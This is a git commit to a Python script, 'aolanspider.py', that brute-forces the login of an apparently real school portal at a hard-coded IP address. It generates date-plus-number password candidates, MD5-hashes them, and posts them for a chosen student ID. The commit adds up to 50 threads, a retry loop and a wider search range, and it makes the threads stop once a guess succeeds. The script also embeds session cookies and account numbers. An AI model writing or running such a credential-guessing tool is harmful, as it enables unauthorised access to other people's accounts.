b532e734115d61e94f83d4b397423d8ae6f22d75
huxi <smxxqjl@gmail.com>
2016-07-08 09:23:57 +0800

    More feature

--- aolanspider.py
+++ aolanspider.py
@@ -1,11 +1,3 @@
-data = {
-        '__VIEWSTATE': 'go6WJBsZ1m4enxs9VlUqZsA0+FTdNM2Yz9OydXYB6rSwW+fW9jeNXI++1nqQxQanNDy75AkmU8tccZCEJOrAdL34sqobmhKbrvvkIHCCytc5JGkOi80L+eSlLUs=',
-        '__VIEWSTATEGENERATOR': 'C2EE9ABB',
-        'userbh': 'B14070328',
-        'pass': '78E636941E3FC7385F49DBB3B4FAA6CC', 
-        'cw': '', 
-        'xzbz': '1' 
-        }
 cookies = {
         'ASP.NET_SessionId': 'mj2pw3vivqiaej4jrsv0w1ql'
         }
@@ -24,24 +16,54 @@ header = {
         }
 
 import requests, re, hashlib, threading, queue
+import sys
 
+processnum = 50
+if len(sys.argv) > 3:
+    print ("Too many argument")
+if len(sys.argv) >= 2:
+    print (sys.argv[1])
+if len(sys.argv) >= 3:
+    processnum = int(sys.argv[2])
 class aolang(threading.Thread):
+
     def __init__(self, cqueue):
         threading.Thread.__init__(self)
         self.cqueue = cqueue
+        self.stop_flag= False
 
     def run(self):
+        data = {
+        '__VIEWSTATE': 'go6WJBsZ1m4enxs9VlUqZsA0+FTdNM2Yz9OydXYB6rSwW+fW9jeNXI++1nqQxQanNDy75AkmU8tccZCEJOrAdL34sqobmhKbrvvkIHCCytc5JGkOi80L+eSlLUs=',
+        '__VIEWSTATEGENERATOR': 'C2EE9ABB',
+        'userbh': 'B14070302',
+        'pass': '78E636941E3FC7385F49DBB3B4FAA6CC', 
+        'cw': '', 
+        'xzbz': '1' 
+        }
+        if len(sys.argv) >= 2:
+            data['userbh'] = sys.argv[1]
         while not self.cqueue.empty():
+            if self.stop_flag:
+                return
             string = self.cqueue.get()
             ss = requests.session()
             codemd5 = hashlib.md5(string.upper().encode()).hexdigest().upper()
             data['pass'] = codemd5
+            for i in range(1, 100):
+                try:
+                    r2 = ss.post('http://180.209.64.253:866/login.aspx', data = data)
+                    #r3 = ss.get('http://180.209.64.253:866/default.aspx')
+                except:
+                    continue
+                break
+
             print (data['pass'])
             print (string)
-            r2 = ss.post('http://180.209.64.253:866/login.aspx', data = data)
-            r3 = ss.get('http://180.209.64.253:866/default.aspx')
-            if '欢迎你'.encode() in r3.content:
-                print (string)
+            if len(r2.history) != 0:
+                for thread in threading.enumerate():
+                    thread.stop_flag = True
+                print ('欢迎你' + string)
                 return
                 '''
                 #cookies = {'ASP.NET_SessionId' :ss.cookies['ASP.NET_SessionId']}
@@ -55,7 +77,7 @@ class aolang(threading.Thread):
                 '''
 codequeue = queue.Queue()
 
-for j in range(1, 1000):
+for j in range(1, 9999):
     substring2 = str(j-1)
     substring2 = (4 - len(substring2))*'0' + substring2
     for i in range(1, 32):
@@ -64,6 +86,6 @@ for j in range(1, 1000):
             substring1 = '0' + substring1 
         string = substring1+substring2
         codequeue.put(string)
-aspider = aolang(codequeue)
-aspider.start()
-aspider.join()
+for i in range(1, processnum+1):
+    aspider = aolang(codequeue)
+    aspider.start()
